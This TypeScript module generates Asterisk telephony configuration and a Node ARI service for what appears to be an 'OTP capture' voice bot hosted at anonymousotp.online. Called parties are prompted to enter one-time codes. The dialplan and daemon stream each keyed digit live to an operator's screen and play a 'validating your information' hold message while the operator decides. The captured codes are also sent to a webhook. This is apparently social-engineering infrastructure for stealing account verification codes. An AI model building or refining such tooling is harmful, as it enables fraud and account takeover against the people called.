import { PjsipExtension, CarrierTrunk, Press1Config, OtpCaptureConfig, AsteriskConnectionSettings } from '../types';

export function generatePjsipConf(extensions: PjsipExtension[], carriers: CarrierTrunk[]): string {
  let conf = `; ==============================================================================
; ASTERISK 20 - PJSIP CONFIGURATION (Generado por Asterisk 20 Governor)
; Sincronización automática vía AMI: "pjsip reload"
; ==============================================================================

; --- TRANSPORTE UDP ---
[transport-udp]
type=transport
protocol=udp
bind=0.0.0.0:5060

; --- TRANSPORTE WSS (WebRTC Softphone) ---
[transport-wss]
type=transport
protocol=wss
bind=0.0.0.0:8089

; --- PLANTILLA BASE PARA EXTENSIONES ---
[endpoint-basic](!)
type=endpoint
context=from-internal
disallow=all
direct_media=no
trust_id_inbound=yes
send_rpid=yes
send_pai=yes
force_rport=yes
rewrite_contact=yes
rtp_symmetric=yes

; ==============================================================================
; EXTENSIONES CONFIGURADAS (${extensions.length})
; ==============================================================================
`;

  extensions.forEach((ext) => {
    conf += `
; --- Extensión ${ext.extension} (${ext.name}) ---
[${ext.extension}](endpoint-basic)
auth=${ext.extension}-auth
aors=${ext.extension}-aor
callerid=${ext.callerId}
allow=${ext.codecs.join(',')}
transport=${ext.transport}

[${ext.extension}-auth]
type=auth
auth_type=userpass
username=${ext.extension}
password=${ext.secret}

[${ext.extension}-aor]
type=aor
max_contacts=${ext.maxContacts}
remove_existing=yes
qualify_frequency=60
qualify_timeout=3.0
`;
  });

  conf += `
; ==============================================================================
; TRONCALES / CARRIERS SIP (${carriers.length})
; ==============================================================================
`;

  carriers.forEach((c) => {
    const slug = c.name.toLowerCase().replace(/[^a-z0-9]/g, '_');
    if (c.authType === 'ip_auth') {
      conf += `
; --- Carrier IP Direct: ${c.name} ---
[${slug}]
type=endpoint
context=${c.inboundContext}
disallow=all
allow=${c.codecs.join(',')}
aors=${slug}_aor
direct_media=no
force_rport=yes
rewrite_contact=yes
rtp_symmetric=yes

[${slug}_aor]
type=aor
contact=sip:${c.host}:${c.port}
qualify_frequency=${c.qualifyFreq}

[${slug}_identify]
type=identify
endpoint=${slug}
match=${c.host}
`;
    } else {
      conf += `
; --- Carrier con Registro: ${c.name} ---
[${slug}_reg]
type=registration
transport=transport-udp
outbound_auth=${slug}_auth
server_uri=sip:${c.host}:${c.port}
client_uri=sip:${c.username || 'user'}@${c.host}:${c.port}
contact_user=${c.username || 'user'}
retry_interval=30
expiration=3600

[${slug}]
type=endpoint
context=${c.inboundContext}
disallow=all
allow=${c.codecs.join(',')}
outbound_auth=${slug}_auth
aors=${slug}_aor
direct_media=no
force_rport=yes
rewrite_contact=yes
from_user=${c.username || 'user'}

[${slug}_auth]
type=auth
auth_type=userpass
username=${c.username || 'user'}
password=${c.secret || ''}

[${slug}_aor]
type=aor
contact=sip:${c.host}:${c.port}
qualify_frequency=${c.qualifyFreq}

[${slug}_identify]
type=identify
endpoint=${slug}
match=${c.host}
`;
    }
  });

  return conf;
}

export function generateExtensionsConf(
  press1: Press1Config,
  otp: OtpCaptureConfig,
  extensions: PjsipExtension[],
  carriers?: CarrierTrunk[]
): string {
  const activeCarriers = carriers && carriers.length > 0 ? carriers : [];
  return `; ==============================================================================
; ASTERISK 20 - DIALPLAN EXTENSIONS.CONF
; Generado dinámicamente con soporte para IVR Press-1, OTP y Troncales Salientes
; ==============================================================================

[general]
static=yes
writeprotect=no
clearglobalvars=no

[globals]
CONSOLE=Console/dsp

; ------------------------------------------------------------------------------
; CONTEXTO INTERNO PARA EXTENSIONES
; ------------------------------------------------------------------------------
[from-internal]
; Marcación entre extensiones configuradas
${extensions
  .map(
    (e) => `exten => ${e.extension},1,NoOp(Llamada interna a ${e.name})
 same => n,Dial(PJSIP/${e.extension},25,tTkK)
 same => n,VoiceMail(${e.extension}@default,u)
 same => n,Hangup()`
  )
  .join('\n\n')}

; Acceso directo a pruebas de IVR desde extensiones
exten => ${press1.extension},1,Goto(ivr-press1,s,1)
exten => ${otp.extension},1,Goto(ivr-otp-capture,s,1)

; ------------------------------------------------------------------------------
; DIALPLAN ENTRY (extensions.conf) - RUTAS SALIENTES POR TRONCAL CARRIER
; ------------------------------------------------------------------------------
${activeCarriers
  .map((c) => {
    const slug = c.name.toLowerCase().replace(/[^a-z0-9]/g, '_');
    const pattern = c.dialplanPattern || '_1XXXXXXXXXX';
    const flags = c.dialFlags || 'Tor';
    return `; Dialplan Entry: ${c.name}
exten => ${pattern},1,NoOp(--- Llamada Saliente PJSIP ---)
 same => n,Dial(PJSIP/\${EXTEN}@${slug},,${flags})
 same => n,Hangup()`;
  })
  .join('\n\n')}

; ------------------------------------------------------------------------------
; CONTEXTO TRONCAL / ENTRANTES
; ------------------------------------------------------------------------------
[from-trunk]
exten => _X.,1,NoOp(Llamada entrante desde Carrier: \${CALLERID(all)})
 same => n,Answer()
 same => n,Goto(ivr-press1,s,1)

[trunkinbound]
exten => _X.,1,NoOp(Llamada entrante trunkinbound: \${CALLERID(all)})
 same => n,Answer()
 same => n,Goto(ivr-press1,s,1)

; ------------------------------------------------------------------------------
; 1. MOTOR IVR PRESS-1 (${press1.enabled ? 'ACTIVO' : 'DESACTIVADO'})
; ------------------------------------------------------------------------------
[ivr-press1]
exten => s,1,NoOp(=== INICIO IVR PRESS 1 ===)
 same => n,Answer()
 same => n,Wait(1)
 same => n,Set(LOOP_COUNT=0)

 same => n(menu),Set(LOOP_COUNT=$[\${LOOP_COUNT} + 1])
 same => n,GotoIf($[\${LOOP_COUNT} > ${press1.maxRetries}]?timeout_hangup)
 ; Reproducir mensaje de bienvenida
 same => n,Background(custom/press1_welcome)
 same => n,WaitExten(${press1.timeoutSeconds})

; Opción 1 presionada
exten => 1,1,NoOp(Usuario presiono 1 -> Verificando Agente Originador)
 same => n,Playback(custom/transfiriendo_asesor)
 ; Evaluación prioritaria:
 ; 1. Variable heredada de canal (__ORIGINATING_EXTEN)
 ; 2. Consulta a la base de datos nativa SQLite3 AstDB: DB(originating_agent/\${CALLERID(num)})
 ${
   press1.returnToOriginatingAgent
     ? `same => n,Set(TARGET_AGENT=\${ORIGINATING_EXTEN})
 same => n,GotoIf($["\${TARGET_AGENT}" != ""]?agent_found)
 ; Respaldo en SQLite3 AstDB nativo (/var/lib/asterisk/astdb.sqlite3):
 same => n,Set(TARGET_AGENT=\${DB(originating_agent/\${CALLERID(num)})})
 same => n,GotoIf($["\${TARGET_AGENT}" != ""]?agent_found:fallback_target)
 same => n(agent_found),NoOp(Retornando llamada al agente que origino el contacto: \${TARGET_AGENT})
 same => n,Dial(PJSIP/\${TARGET_AGENT},30,tTkK)
 same => n,Hangup()
 same => n(fallback_target),NoOp(Sin agente en canal ni en AstDB SQLite3. Destino de respaldo: ${press1.digit1Target})
 same => n,Dial(PJSIP/${press1.digit1Target},30,tTkK)
 same => n,Hangup()`
     : `same => n,Dial(PJSIP/${press1.digit1Target},30,tTkK)
 same => n,Hangup()`
 }

; Opción 2 o colgar
exten => 2,1,NoOp(Usuario cancelo)
 same => n,Playback(custom/gracias_hasta_luego)
 same => n,Hangup()

; Entrada invalida
exten => i,1,NoOp(Digito invalido en Press 1)
 same => n,Playback(custom/opcion_invalida)
 same => n,Goto(s,menu)

; Timeout
exten => t,1,NoOp(Timeout en espera de digito)
 same => n,Goto(s,menu)

exten => s,n(timeout_hangup),NoOp(Intentos maximos superados)
 same => n,Playback(custom/intentos_superados)
 same => n,Hangup()

; ------------------------------------------------------------------------------
; 2. MOTOR DE CAPTURA DE OTP POR VOZ (${otp.digitLength} DIGITOS)
; Enrutado hacia ARI Stasis (Recomendado) con fallback a Dialplan nativo
; ------------------------------------------------------------------------------
[ivr-otp-capture]
exten => s,1,NoOp(=== INICIO CAPTURA DE OTP ===)
 same => n,Answer()
 same => n,Wait(1)
 ; Si ARI esta activo, entrega el canal a la aplicacion Stasis
 same => n,Stasis(${otp.stasisAppName})
 ; Si Stasis no responde, ejecutar el fallback nativo:
 same => n,Goto(ivr-otp-native-fallback,s,1)

[ivr-otp-native-fallback]
exten => s,1,NoOp(Ejecutando captura OTP via Dialplan nativo Read())
 same => n,Set(OTP_TRIES=0)

 same => n(ask),Set(OTP_TRIES=$[\${OTP_TRIES} + 1])
 same => n,GotoIf($[\${OTP_TRIES} > ${otp.maxAttempts}]?block_call)
 same => n,Read(INPUT_OTP,custom/prompt_otp_digits,${otp.digitLength},,1,${otp.timeoutSeconds})
 same => n,NoOp(Digitos ingresados por usuario: \${INPUT_OTP})

 ; Locución al cliente en espera mientras el asesor valida la información:
 same => n,Playback(custom/un_momento_validando_informacion)

 ; Registro en SQLite3 AstDB nativo para consulta del asesor en tiempo real:
 same => n,Set(DB(otp_pending/\${UNIQUEID})=\${INPUT_OTP})

 ; Validacion contra Webhook central / Decision de Asesor
 same => n,Set(AUTH_RESP=\${CURL(${otp.webhookUrl}?caller=\${CALLERID(num)}&otp=\${INPUT_OTP}&agent=\${ORIGINATING_EXTEN})})
 same => n,NoOp(Respuesta Webhook: \${AUTH_RESP})
 same => n,GotoIf($["\${AUTH_RESP}" = "OK_AUTHORIZED"]?auth_ok:auth_fail)

 same => n(auth_ok),NoOp(OTP Validado con exito!)
 same => n,Playback(custom/otp_validado_exitosamente)
 same => n,Dial(PJSIP/${otp.successTarget || '1001'},30)
 same => n,Hangup()

 same => n(auth_fail),NoOp(OTP Invalido)
 same => n,Playback(custom/otp_invalido_reintente)
 same => n,Goto(ask)

 same => n(block_call),NoOp(Intentos de OTP agotados)
 same => n,Playback(custom/intentos_agotados_bloqueo)
 same => n,Hangup()
`;
}

export function generateSipConf(carriers: CarrierTrunk[]): string {
  let conf = `; ==============================================================================
; ASTERISK - CARRIER ACCOUNT ENTRY (sip.conf)
; Formato estándar para conexión con Carrier SIP
; ==============================================================================

[general]
context=trunkinbound
bindport=5060
bindaddr=0.0.0.0
srvlookup=yes
disallow=all
allow=ulaw,alaw,g729
`;

  carriers.forEach((c) => {
    const slug = c.name.toLowerCase().replace(/[^a-z0-9]/g, '_');
    conf += `
; Carrier Account Entry (
; sip.conf
; )
[${slug}]
host=${c.host}
username=${c.username || slug}
secret=${c.secret || ''}
type=peer
context=${c.inboundContext || 'trunkinbound'}
fromuser=${c.fromuser || c.username || slug}
sendrpid=${c.sendrpid || 'yes'}
trustrpid=${c.trustrpid || 'yes'}
insecure=${c.insecure || 'port,invite'}
`;
  });

  return conf;
}

export function generateManagerConf(settings: AsteriskConnectionSettings): string {
  return `; ==============================================================================
; ASTERISK 20 - AMI (Asterisk Manager Interface) CONFIGURATION
; manager.conf
; ==============================================================================

[general]
enabled = yes
port = ${settings.amiPort}
bindaddr = 0.0.0.0
displayconnects = no

[${settings.amiUser}]
secret = ${settings.amiSecret}
deny = 0.0.0.0/0.0.0.0
permit = 127.0.0.1/255.255.255.255
permit = 10.0.0.0/255.0.0.0
permit = 172.16.0.0/255.240.0.0
permit = 192.168.0.0/255.255.0.0
read = system,call,log,verbose,command,agent,user,config,dtmf,reporting,cdr,dialplan,originate
write = system,call,log,verbose,command,agent,user,config,dtmf,reporting,cdr,dialplan,originate
writetimeout = 5000
`;
}

export function generateAriConf(settings: AsteriskConnectionSettings): string {
  return `; ==============================================================================
; ASTERISK 20 - ARI (Asterisk REST Interface) CONFIGURATION
; ari.conf & http.conf (Dominio: https://anonymousotp.online/)
; ==============================================================================

; --- ari.conf ---
[general]
enabled = yes
pretty = yes
allowed_origins = https://anonymousotp.online,http://localhost:3000,*

[${settings.ariUser}]
type = user
read_only = no
password = ${settings.ariSecret}
password_format = plain

; --- http.conf ---
; [general]
; enabled=yes
; bindaddr=0.0.0.0
; bindport=${settings.ariPort}
; sessionlimit=100
; tlsenable=yes
; tlsbindaddr=0.0.0.0:8089
; tlscertfile=/etc/letsencrypt/live/anonymousotp.online/fullchain.pem
; tlsprivatekey=/etc/letsencrypt/live/anonymousotp.online/privkey.pem
`;
}

export function generateAriNodeDaemon(settings: AsteriskConnectionSettings, otp: OtpCaptureConfig, press1: Press1Config): string {
  return `/**
 * ASTERISK 20 - ARI STASIS MICROSERVICE (Press 1 & OTP Capture Engine)
 * Requisitos: npm install ari-client axios
 * Ejecución: node otp_ari_service.js
 */

const client = require('ari-client');
const axios = require('axios');

const ARI_URL = 'http://${settings.ariHost}:${settings.ariPort}';
const ARI_USER = '${settings.ariUser}';
const ARI_PASS = '${settings.ariSecret}';
const APP_NAME = '${otp.stasisAppName}';

console.log('[ARI] Conectando a Asterisk 20 ARI en ' + ARI_URL + '...');

client.connect(ARI_URL, ARI_USER, ARI_PASS, (err, ari) => {
  if (err) {
    console.error('[ARI ERROR] No se pudo conectar a Asterisk:', err);
    process.exit(1);
  }

  console.log('[ARI] Conectado exitosamente. Registrando Stasis App:', APP_NAME);

  // Buffer de estado por canal
  const sessionData = new Map();

  ari.on('StasisStart', (event, channel) => {
    console.log(\`[CALL START] Canal entrante \${channel.id} desde \${channel.caller.number}\`);

    // Inicializar sesion
    sessionData.set(channel.id, {
      digitsBuffer: '',
      attempts: 0,
      maxAttempts: ${otp.maxAttempts},
      expectedLength: ${otp.digitLength},
      step: 'COLLECTING_OTP',
    });

    // 1. Responder canal
    channel.answer((err) => {
      if (err) return console.error('Error answering channel:', err);

      // 2. Reproducir bienvenida y solicitud de OTP
      const playback = ari.Playback();
      channel.play({ media: 'sound:custom/prompt_otp_digits' }, playback, (err) => {
        if (err) console.error('Playback error:', err);
      });
    });
  });

  // Captura de DTMF en tiempo real con emisión a la pantalla del agente
  ari.on('ChannelDtmfReceived', async (event, channel) => {
    const digit = event.digit;
    console.log(\`[DTMF REAL-TIME] Canal \${channel.id} pulso: \${digit}\`);

    const session = sessionData.get(channel.id);
    if (!session) return;

    // Emisión en tiempo real a la pantalla del operador (Live Agent Screen)
    ${
      otp.enableAgentRealtimeScreen
        ? `if (global.agentWss) {
      global.agentWss.clients.forEach(client => {
        if (client.readyState === 1) {
          client.send(JSON.stringify({
            event: 'AGENT_DTMF_STREAM',
            channelId: channel.id,
            digit: '${otp.maskDigitsOnAgentScreen ? '•' : "' + digit + '"}',
            timestamp: Date.now()
          }));
        }
      });
    }`
        : ''
    }

    if (digit === '#') {
      // El usuario finalizo el ingreso con #
      await evaluateOtp(channel, session);
    } else {
      session.digitsBuffer += digit;
      // Si alcanzo la cantidad requerida de digitos
      if (session.digitsBuffer.length >= session.expectedLength) {
        await evaluateOtp(channel, session);
      }
    }
  });

  async function evaluateOtp(channel, session) {
    const enteredOtp = session.digitsBuffer;
    session.digitsBuffer = ''; // reset buffer
    session.attempts += 1;

    console.log(\`[CLIENTE DIGITÓ CÓDIGO] Código \${enteredOtp} recibido. Poniendo cliente en espera telefónica...\`);

    // 1. Reproducir locución de espera al cliente: "Un momento por favor, estamos validando su información..."
    const waitPlayback = ari.Playback();
    channel.play({ media: 'sound:custom/un_momento_validando_informacion' }, waitPlayback, (err) => {
      if (err) console.warn('Wait playback notice:', err);
    });

    // 2. Notificar por WebSocket al Asesor con los dígitos para su decisión manual en pantalla (Válido / Inválido)
    if (global.agentWss) {
      global.agentWss.clients.forEach((client) => {
        if (client.readyState === 1) {
          client.send(
            JSON.stringify({
              event: 'AGENT_DECISION_REQUIRED',
              channelId: channel.id,
              callerNumber: channel.caller.number,
              enteredOtp: enteredOtp,
              validationMode: '${otp.validationMode || 'agent_manual'}',
              promptPlaying: 'sound:custom/un_momento_validando_informacion',
              timestamp: Date.now(),
            })
          );
        }
      });
    }

    try {
      // Si el modo es automático por Webhook, o como respaldo para registrar en base de datos:
      const response = await axios.post('${otp.webhookUrl}', {
        channelId: channel.id,
        callerNumber: channel.caller.number,
        otp: enteredOtp,
        validationMode: '${otp.validationMode || 'agent_manual'}',
        timestamp: new Date().toISOString()
      }, {
        headers: {
          'Authorization': '${otp.webhookAuthHeader}',
          'Content-Type': 'application/json'
        },
        timeout: 4000
      });

      if (response.data && response.data.valid === true) {
        console.log(\`[OTP VALIDADO] Exito para canal \${channel.id}\`);
        const p = ari.Playback();
        channel.play({ media: 'sound:custom/otp_validado_exitosamente' }, p, () => {
          // Transferir o colgar
          channel.continueInDialplan({
            context: 'from-internal',
            extension: '${otp.successTarget || '1001'}',
            priority: 1
          }, () => {});
        });
      } else {
        throw new Error('Codigo no coincide');
      }
    } catch (apiErr) {
      console.warn(\`[OTP INVALIDO] Error o rechazo: \${apiErr.message}\`);

      if (session.attempts >= session.maxAttempts) {
        const p = ari.Playback();
        channel.play({ media: 'sound:custom/intentos_agotados_bloqueo' }, p, () => {
          setTimeout(() => channel.hangup(() => {}), 2000);
        });
      } else {
        const p = ari.Playback();
        channel.play({ media: 'sound:custom/otp_invalido_reintente' }, p, () => {});
      }
    }
  }

  ari.on('StasisEnd', (event, channel) => {
    console.log(\`[CALL END] Canal \${channel.id} finalizado\`);
    sessionData.delete(channel.id);
  });

  ari.start(APP_NAME);
});
`;
}

export function generateNginxDomainConf(settings: AsteriskConnectionSettings): string {
  return `# ==============================================================================
# NGINX REVERSE PROXY & SSL (Let's Encrypt) PARA: https://anonymousotp.online/
# Archivo: /etc/nginx/sites-available/anonymousotp.online.conf
# ==============================================================================

# Redirección HTTP -> HTTPS
server {
    listen 80;
    listen [::]:80;
    server_name anonymousotp.online www.anonymousotp.online;

    location /.well-known/acme-challenge/ {
        root /var/www/certbot;
    }

    location / {
        return 301 https://$host$request_uri;
    }
}

# Servidor Seguro HTTPS (anonymousotp.online)
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name anonymousotp.online www.anonymousotp.online;

    # Certificados SSL de Let's Encrypt
    ssl_certificate /etc/letsencrypt/live/anonymousotp.online/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/anonymousotp.online/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # Cabeceras de seguridad
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN";
    add_header X-Content-Type-Options "nosniff";

    # 1. Aplicación Web Frontend / Consola
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # 2. Asterisk REST Interface (ARI) & WebSockets
    location /ari/ {
        proxy_pass http://127.0.0.1:${settings.ariPort}/ari/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # 3. WebRTC SIP WSS Signaling (Asterisk PJSIP WebSocket en 8089)
    location /ws {
        proxy_pass http://127.0.0.1:8089/ws;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "Upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # 4. Webhook API Endpoint (/api/v1/telephony/verify-otp)
    location /api/ {
        proxy_pass http://127.0.0.1:3000/api/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
`;
}

export function generateSetupScript(): string {
  return `#!/bin/bash
# ==============================================================================
# SCRIPT DE PUESTA EN MARCHA RÁPIDA: ASTERISK 20 GOVERNOR & SYNC
# Compatible con Ubuntu 22.04 / 24.04 LTS y Debian 11/12
# ==============================================================================

set -e

echo "=== [1/5] Verificando instalación de Asterisk 20 ==="
if ! command -v asterisk &> /dev/null; then
    echo "Asterisk no detectado. Instalando paquetes base..."
    sudo apt update
    sudo apt install -y asterisk asterisk-modules asterisk-pjsip asterisk-doc
else
    echo "Asterisk versión instalada: $(asterisk -V)"
fi

echo "=== [2/5] Creando directorio para respaldos y configuración modular ==="
sudo mkdir -p /etc/asterisk/backup_$(date +%Y%m%d_%H%M%S)
sudo cp /etc/asterisk/pjsip.conf /etc/asterisk/backup_*/ 2>/dev/null || true
sudo cp /etc/asterisk/extensions.conf /etc/asterisk/backup_*/ 2>/dev/null || true

echo "=== [3/5] Habilitando módulos PJSIP, AMI y ARI ==="
sudo tee -a /etc/asterisk/modules.conf << 'EOF'
load => res_pjsip.so
load => res_pjsip_session.so
load => res_pjsip_authenticator_digest.so
load => res_pjsip_endpoint_identifier_ip.so
load => res_pjsip_endpoint_identifier_user.so
load => res_ari.so
load => res_ari_channels.so
load => res_ari_playbacks.so
load => res_http_websocket.so
EOF

echo "=== [4/5] Permisos en Asterisk ==="
sudo chown -R asterisk:asterisk /etc/asterisk
sudo chmod 640 /etc/asterisk/*.conf

echo "=== [5/5] Recargando Asterisk 20 sin cortes ==="
sudo asterisk -rx "core reload"
sudo asterisk -rx "pjsip reload"
sudo asterisk -rx "dialplan reload"
sudo asterisk -rx "module show like pjsip"

echo "=== ¡Listo! Asterisk 20 preparado para sincronización instantánea vía AMI y ARI ==="
`;
}

export function generateResConfigSqliteConf(settings: AsteriskConnectionSettings): string {
  return `; ==============================================================================
; ASTERISK 20 - RES_CONFIG_SQLITE3 CONFIGURATION
; Conexión del motor nativo SQLite3 de Asterisk para PJSIP Realtime
; ==============================================================================

[general]
dbfile => ${settings.sqliteRealtimeDbPath}

; Opciones de rendimiento y concurrencia SQLite3 WAL (Write-Ahead Logging)
; Permite lecturas concurrentes sin bloquear escrituras durante ráfagas de llamadas
busy_timeout => 5000
journal_mode => WAL
synchronous => NORMAL
`;
}

export function generateExtconfigConf(): string {
  return `; ==============================================================================
; ASTERISK 20 - EXTCONFIG CONFIGURATION (MAPEO REALTIME -> SQLITE3)
; Mapea tablas PJSIP dinámicas directamente al driver res_config_sqlite3
; ==============================================================================

[settings]
ps_endpoints => sqlite3,general,ps_endpoints
ps_auths => sqlite3,general,ps_auths
ps_aors => sqlite3,general,ps_aors
ps_domain_aliases => sqlite3,general,ps_domain_aliases
ps_endpoint_id_ips => sqlite3,general,ps_endpoint_id_ips
ps_registrations => sqlite3,general,ps_registrations
`;
}

export function generateCdrSqliteConf(settings: AsteriskConnectionSettings): string {
  return `; ==============================================================================
; ASTERISK 20 - CDR_SQLITE3_CUSTOM CONFIGURATION
; Registro de detalle de llamadas (CDR) directamente en base de datos SQLite3
; ==============================================================================

[master]
; Ruta del archivo SQLite3
dbfile => ${settings.sqliteCdrDbPath}

; Tabla destino
table => cdr

; Columnas con campos personalizados para Agente Originador y Token OTP
columns => calldate, clid, src, dst, dcontext, channel, dstchannel, lastapp, lastdata, duration, billsec, disposition, amaflags, accountcode, uniqueid, userfield
values => '\${CDR(start)}', '\${CDR(clid)}', '\${CDR(src)}', '\${CDR(dst)}', '\${CDR(dcontext)}', '\${CDR(channel)}', '\${CDR(dstchannel)}', '\${CDR(lastapp)}', '\${CDR(lastdata)}', \${CDR(duration)}, \${CDR(billsec)}, '\${CDR(disposition)}', \${CDR(amaflags)}, '\${CDR(accountcode)}', '\${CDR(uniqueid)}', '\${CDR(userfield)}'
`;
}

export function generateSqliteSchema(extensions: PjsipExtension[]): string {
  return `-- ==============================================================================
-- ASTERISK 20: ESQUEMA DDL SQLITE3 NATIVO (PJSIP REALTIME + CDR + AUDIT)
-- Archivo: /var/lib/asterisk/realtime.sqlite3 y /var/log/asterisk/master.db
-- ==============================================================================

PRAGMA journal_mode = WAL;
PRAGMA synchronous = NORMAL;
PRAGMA foreign_keys = ON;

-- 1. TABLA DE ENDPOINTS PJSIP
CREATE TABLE IF NOT EXISTS ps_endpoints (
  id TEXT PRIMARY KEY,
  transport TEXT DEFAULT 'transport-udp',
  aors TEXT,
  auth TEXT,
  context TEXT DEFAULT 'from-internal',
  disallow TEXT DEFAULT 'all',
  allow TEXT DEFAULT 'ulaw,alaw,g729',
  direct_media TEXT DEFAULT 'no',
  dtmf_mode TEXT DEFAULT 'rfc4733',
  force_rport TEXT DEFAULT 'yes',
  rewrite_contact TEXT DEFAULT 'yes',
  rtp_symmetric TEXT DEFAULT 'yes'
);

-- 2. TABLA DE AUTENTICACIÓN PJSIP
CREATE TABLE IF NOT EXISTS ps_auths (
  id TEXT PRIMARY KEY,
  auth_type TEXT DEFAULT 'userpass',
  password TEXT NOT NULL,
  username TEXT NOT NULL
);

-- 3. TABLA DE CONTACTOS / AORS PJSIP
CREATE TABLE IF NOT EXISTS ps_aors (
  id TEXT PRIMARY KEY,
  max_contacts INTEGER DEFAULT 1,
  remove_existing TEXT DEFAULT 'yes',
  qualify_frequency INTEGER DEFAULT 60,
  qualify_timeout REAL DEFAULT 3.0
);

-- 4. TABLA CDR (DETALLE DE LLAMADAS)
CREATE TABLE IF NOT EXISTS cdr (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  calldate TEXT NOT NULL,
  clid TEXT,
  src TEXT NOT NULL,
  dst TEXT NOT NULL,
  dcontext TEXT DEFAULT 'from-internal',
  channel TEXT,
  dstchannel TEXT,
  lastapp TEXT,
  lastdata TEXT,
  duration INTEGER DEFAULT 0,
  billsec INTEGER DEFAULT 0,
  disposition TEXT DEFAULT 'ANSWERED',
  amaflags INTEGER DEFAULT 3,
  accountcode TEXT,
  uniqueid TEXT UNIQUE,
  userfield TEXT
);

CREATE INDEX IF NOT EXISTS idx_cdr_calldate ON cdr(calldate);
CREATE INDEX IF NOT EXISTS idx_cdr_src ON cdr(src);
CREATE INDEX IF NOT EXISTS idx_cdr_dst ON cdr(dst);

-- ==============================================================================
-- POBLADO INICIAL DE EXTENSIONES (${extensions.length} REGISTROS)
-- ==============================================================================
${extensions
  .map(
    (ext) => `
INSERT OR REPLACE INTO ps_auths (id, auth_type, username, password)
VALUES ('${ext.extension}-auth', 'userpass', '${ext.extension}', '${ext.secret}');

INSERT OR REPLACE INTO ps_aors (id, max_contacts, remove_existing, qualify_frequency)
VALUES ('${ext.extension}-aor', ${ext.maxContacts}, 'yes', 60);

INSERT OR REPLACE INTO ps_endpoints (id, transport, aors, auth, context, disallow, allow)
VALUES ('${ext.extension}', '${ext.transport}', '${ext.extension}-aor', '${ext.extension}-auth', 'from-internal', 'all', '${ext.codecs.join(',')}');
`
  )
  .join('\n')}
`;
}
